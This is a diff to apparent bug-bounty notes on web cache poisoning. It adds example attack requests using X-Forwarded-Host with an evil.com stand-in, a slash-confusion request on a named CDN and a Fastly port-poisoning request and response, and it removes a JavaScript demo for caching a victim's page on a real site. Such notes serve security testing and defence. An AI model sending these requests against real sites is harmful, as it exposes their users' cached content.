@@ -92,6 +92,29 @@ Max bounty $3k Exploit
 > Host: redacted.com
 > X-Forwarded-Scheme: https
 > X-Forwarded-Host: <evil.com>
+https://hackerone.com/reports/1795197
+
+# Real World Exploit - Slash Confusion
+https://hackerone.com/reports/1695604
+> GET /static\javascripts\vendor\bugsnag.v7.4.0.min.js?cachebuster=123 HTTP/1.1
+> Host: cdn.shopify.com
+
+# GET body parameters (fat GET) vulnerabilities
+This is where the web app allows GET request 
+with body. This is not SPEC compliant and can 
+sometimes result in the web server mistakenly fetching 
+the body parameters when it was trying to fetch query parameters. 
+I hope you get the cache poisoning implication. The Cache Proxy uses the query
+parameters as part of the cache key but the returned response was actually 
+influenced by the body params. 
+Affected Tornado https://www.tornadoweb.org/en/stable/
+
+# Sometimes web apps gives precedence to the body parameters
+Yeah, right? Super weird. This can lead to the Cache proxy caching 
+a resource identified by the body params instead of the query params,
+meanwhile the query params becomes part of the cache key, an example of 
+what james kettle described in Practical Web Poisoning
+https://snyk.io/blog/cache-poisoning-in-popular-open-source-packages/
 
 also check X-Forwarded-Proto: http 
 > GET /random HTTP/1.1
@@ -101,6 +124,25 @@ also check X-Forwarded-Proto: http
 > HTTP/1.1 301 moved permanently
 > Location: https://innocent-site.com/random
 > Authorization:        crafted headers      see https://hackerone.com/reports/1173153
+
+# Fastly Cache Poisoning with X-Forwarded-Host and Port Numbers 
+https://www.fastly.com/security-advisories/fastly-security-advisory-cache-poisoning-vulnerability-leveraging-x-forwarded-host-header
+Attacker Request
+> GET / HTTP/1.1
+> Host: www.example.com
+> X-Forwarded-Host: www.example.com:10000
+Redirect Response
+> HTTP/1.1 302 Found
+> Location: https://www.example.com:10000/en
+> X-Cache: MISS, MISS
+
+Victim Request + Response
+> GET / HTTP/1.1
+> Host: www.example.com
+
+> HTTP/1.1 302 Found
+> Location: https://www.example.com:10000/en
+> X-Cache: MISS, HIT
 
 # Bypassing WAF <PHP Frameworks>
 > GET /admin HTTP/1.1
@@ -141,43 +183,11 @@ also check X-Forwarded-Proto: http
 Notice the unkeyed cookie language=pl. when cached, and served to 
 en-gb users, i.e a mild web cache poisoning
 
-DEMO Script 
-`
-<html>
-  <head> </head>
-  <body>
-    <script>
-      var cachedUrl = "https://www.lyst.com/" + generateId() + ".css";
-      const popup = window.open(cachedUrl);
-      function generateId() {
-        var content = "";
-        const alphaWithNumber = "QWERTZUIOPASDFGHJUKLYXCVBNM1234567890";
-        for (var i = 0; i < 10; i++) {
-          content += alphaWithNumber.charAt(
-            Math.floor(Math.random() * alphaWithNumber.length)
-          );
-        }
-        return content;
-      }
-      var checker = setInterval(function () {
-        if (popup.closed) {
-          clearInterval(checker);
-        }
-      }, 200);
-      var closer = setInterval(function () {
-        popup.close();
-        document.body.innerHTML =
-          'Victims content is now cached <a href="' +
-          cachedUrl +
-          '">here and the url can be saved on the hackers server</a><br><b>Full Url: ' +
-          cachedUrl +
-          "</b>";
-        clearInterval(closer);
-      }, 3000);
-    </script>
-  </body>
-</html>
-`
+# Specific Cache Proxy Behaviors 
+## Varnish 
+404 and 301 is cached for 15 mins
+Max Cache size 10mb 
+https://docs.acquia.com/acquia-cloud-platform/using-varnish
 
 # Web Cache Entanglement
 ## Discreet Poisoning: 
@@ -214,15 +224,16 @@ Asking Nicely:
 # CloudFlare's Protection
 https://blog.cloudflare.com/cache-poisoning-protection/
 Solution: include “interesting” header values in the cache key
-Instead, we decided to change our cache keys for a request only if we think it may influence the origin response. Our default cache key got a bunch of new values:
-
-HTTP Scheme
-HTTP Host
-Path
-Query string
-X-Forwarded-Host header
-X-Host header
-X-Forwarded-Scheme header
+Instead, we decided to change our cache keys for a request only if we think it may influence the origin response. 
+Our default cache key got a bunch of new values:
+## Cloudflare Cache Key Values
+> HTTP Scheme
+> HTTP Host
+> Path
+> Query string
+> X-Forwarded-Host header
+> X-Host header
+> X-Forwarded-Scheme header
 
 # Gobuster Fuzzing for Web Cache Poisoning 
 Info: gobuster fuzz --help
